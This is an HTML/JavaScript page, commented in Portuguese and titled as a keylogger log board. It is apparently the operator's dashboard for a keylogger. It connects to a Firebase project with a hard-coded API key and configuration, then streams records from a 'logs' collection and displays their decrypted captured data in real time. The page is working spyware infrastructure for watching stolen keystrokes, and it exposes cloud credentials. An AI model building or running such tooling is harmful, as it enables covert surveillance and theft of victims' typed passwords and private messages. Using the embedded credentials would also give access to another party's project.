<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Quadro de Logs do Keylogger</title>
    <style>
        body {
            background-color: black;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        #logs-container {
            background-color: white;
            width: 80%;
            height: 60%;
            padding: 20px;
            overflow-y: auto;
        }
    </style>
</head>
<body>
    <div id="logs-container"></div>

    <!-- Adicione o SDK do Firebase -->
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script>

    <script>
        // Configurações do Firebase (substitua pelas suas próprias configurações)
        const firebaseConfig = {
            apiKey: "AIzaSyD97RPWRXb1ctksvWSvzm3NZ0earAn7Mcc",
            authDomain: "visualizado-realtime.firebaseapp.com",
            databaseURL: "https://visualizado-realtime-default-rtdb.firebaseio.com",
            projectId: "visualizado-realtime",
            storageBucket: "visualizado-realtime.appspot.com",
            messagingSenderId: "279838352172",
            appId: "1:279838352172:web:1f948ee868297e229d8289"
        };

        // Inicialize o Firebase
        firebase.initializeApp(firebaseConfig);

        // Referência para o Firestore
        const db = firebase.firestore();

        // Referência ao elemento do quadro de logs
        const logsContainer = document.getElementById("logs-container");

        // Função para adicionar um log ao container
        function adicionarLog(log) {
            const paragrafo = document.createElement("p");
            paragrafo.textContent = log;
            logsContainer.appendChild(paragrafo);
        }

        // Função para exibir logs do Firestore em tempo real
        function exibirLogs() {
            // Limpa o conteúdo anterior
            logsContainer.innerHTML = "";

            // Obtém os logs do Firestore em tempo real
            db.collection("logs").orderBy("timestamp").onSnapshot(snapshot => {
                snapshot.docChanges().forEach(change => {
                    if (change.type === "added") {
                        adicionarLog(change.doc.data().decrypted_data);
                    }
                });
            });
        }

        // Exibe os logs ao carregar a página
        window.onload = exibirLogs;
    </script>
</body>
</html>
